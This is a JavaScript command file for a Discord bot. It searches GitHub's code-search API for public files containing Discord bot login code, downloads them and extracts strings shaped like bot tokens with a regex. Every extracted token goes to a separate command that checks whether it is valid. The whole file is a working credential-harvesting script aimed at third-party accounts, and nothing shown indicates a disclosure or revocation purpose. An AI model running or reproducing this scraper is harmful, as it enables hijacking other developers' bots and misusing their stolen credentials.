const Commands = require(`../../../../__Global/Structures/Commands`);
const { get } = require('snekfetch');

class Command extends Commands {
	constructor(client) {
		super(client, {
			enabled: true,
			show: true,
			cooldown: false,
			cooldownAmount: 1,
			cooldownTime: 3,
			limit: false,
			limitAmount: 3,
			limitTime: 86400,
			description: ``,
			usage: ``,
			aliases: []
		});
	}

	async run(client, message, args) {
		const queries = [
			'require(\'discord.js\')',
			'discord "bot.run"',
			'discord "client.run"',
			'discord "bot.login"',
			'discord "client.login"',
			'discord.js "bot.login"',
			'discord.js "client.login"',
			'discord.io new client token'
		];
		const files = [];

		for (const query of queries) {
			const { body } = await get(`https://api.github.com/search/code?q=${encodeURIComponent(`${query} language:javascript`).replace(/%20/g, '+')}`).set('Authorization', process.env.GITHUB_API);
			files.push(...body.items.map(item => item.url.split('?')[0]).filter(url => !files.includes(url)));
		}

		for (const file of files) {
			const res = await get(file).set('Authorization', process.env.GITHUB_API);
			const content = Buffer.from(res.body.content, `base64`).toString(`ascii`);
			await setTimeout(() => null, 1000);
			const tokens = content.match(/M[A-Za-z0-9._-]{58}/g);
			if (tokens) {
				for (const token of tokens) {
					client.cmds.commands.get(`token`).check(token, message.author.username)
				}
			}
		}
		return true;
	}
}

module.exports = Command;
